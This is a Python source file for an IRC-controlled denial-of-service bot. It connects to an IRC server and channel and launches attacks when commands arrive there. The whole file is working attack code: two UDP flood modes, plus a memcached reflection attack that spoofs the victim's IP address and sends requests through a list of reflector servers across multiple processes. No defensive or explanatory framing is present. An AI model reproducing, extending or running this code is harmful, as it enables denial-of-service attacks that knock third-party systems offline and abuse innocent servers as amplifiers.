import irc.bot
import irc.connection
import irc.strings
import socket
import time
import random
import string
import multiprocessing
import ssl
import os
import warnings
from scapy.all import IP, UDP, send, Raw
from colorama import Fore
from scapy.config import conf

# Suppress the specific Scapy warning
warnings.filterwarnings("ignore", message="Mac address to reach destination not found", category=UserWarning)

# Ensure scapy doesn't try to resolve IP addresses to MAC addresses
conf.verb = 0

# Define attack_process as a top-level function
def attack_process(target_ip, target_port, duration, rate_mbps, bots):
    start_time = time.time()
    bytes_per_sec = rate_mbps * 1024 * 1024 / 8
    payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
    packet_size = len(IP()/UDP()/Raw(load=payload))

    while time.time() - start_time < duration:
        send_time = time.time()
        server = random.choice(bots)
        server = server.strip()
        try:
            packet = (
                IP(dst=server, src=target_ip)
                / UDP(sport=int(target_port), dport=11211)
                / Raw(load=payload)
            )
            send(packet, verbose=False)
        except Exception as e:
            pass

        # Calculate time to sleep before sending next packet
        send_time_diff = time.time() - send_time
        sleep_time = max(0, packet_size / bytes_per_sec - send_time_diff)
        time.sleep(sleep_time)

class SimpleBot(irc.bot.SingleServerIRCBot):
    def __init__(self, channel, server, port=6697, use_ssl=True):
        nickname = self.generate_random_nickname()
        factory = irc.connection.Factory(wrapper=ssl.SSLContext().wrap_socket) if use_ssl else irc.connection.Factory()
        super().__init__([(server, port)], nickname, nickname, connect_factory=factory)
        self.channel = channel

    def generate_random_nickname(self):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=8))

    def on_welcome(self, connection, event):
        connection.join(self.channel)

    def on_pubmsg(self, connection, event):
        message = event.arguments[0]
        sender = event.source.nick
        
        if message.startswith("!attack HEX"):
            params = message.split()
            if len(params) == 5:
                ip = params[2]
                port = int(params[3])
                duration = int(params[4])
                self.attack_hex(connection, ip, port, duration)
            else:
                connection.privmsg(self.channel, "Usage: !attack HEX <ip> <port> <duration>")
        
        elif message.startswith("!attack JUNK"):
            params = message.split()
            if len(params) == 5:
                ip = params[2]
                port = int(params[3])
                duration = int(params[4])
                self.attack_junk(connection, ip, port, duration)
            else:
                connection.privmsg(self.channel, "Usage: !attack JUNK <ip> <port> <duration>")
        
        elif message.startswith("!attack MEMCACHED"):
            params = message.split()
            if len(params) == 7:
                target_ip = params[2]
                target_port = params[3]
                duration = int(params[4])
                rate_mbps = float(params[5])
                num_processes = int(params[6])
                self.attack_memcached(target_ip, target_port, duration, rate_mbps, num_processes)
            else:
                connection.privmsg(self.channel, "Usage: !attack MEMCACHED <target_ip> <target_port> <duration> <rate_mbps> <num_processes>")

    def attack_hex(self, connection, ip, port, duration):
        end_time = time.time() + duration
        payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'
        while time.time() < end_time:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(payload, (ip, port))
            s.sendto(payload, (ip, port))
            s.sendto(payload, (ip, port))
            s.sendto(payload, (ip, port))
            s.sendto(payload, (ip, port))
            s.sendto(payload, (ip, port))
            s.close()

    def attack_junk(self, connection, ip, port, duration):
        end_time = time.time() + duration
        payload = b'\x00' * 64
        while time.time() < end_time:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(payload, (ip, port))
            s.sendto(payload, (ip, port))
            s.sendto(payload, (ip, port))
            s.close()

    def attack_memcached(self, target_ip, target_port, duration, rate_mbps, num_processes):
        # Load Bots list
        with open("botmemcached.txt", "r") as f:
            bots = f.readlines()
        
        # Start multiple processes for the attack
        processes = []
        for _ in range(num_processes):
            p = multiprocessing.Process(target=attack_process, args=(target_ip, target_port, duration, rate_mbps, bots))
            p.start()
            processes.append(p)
        
        # Wait for all processes to finish
        for p in processes:
            p.join()

if __name__ == "__main__":
    CHANNEL = "#anontoken"
    SERVER = "irc.anonops.com"
    PORT = 6697
    
    bot = SimpleBot(CHANNEL, SERVER, PORT, use_ssl=True)
    bot.start()
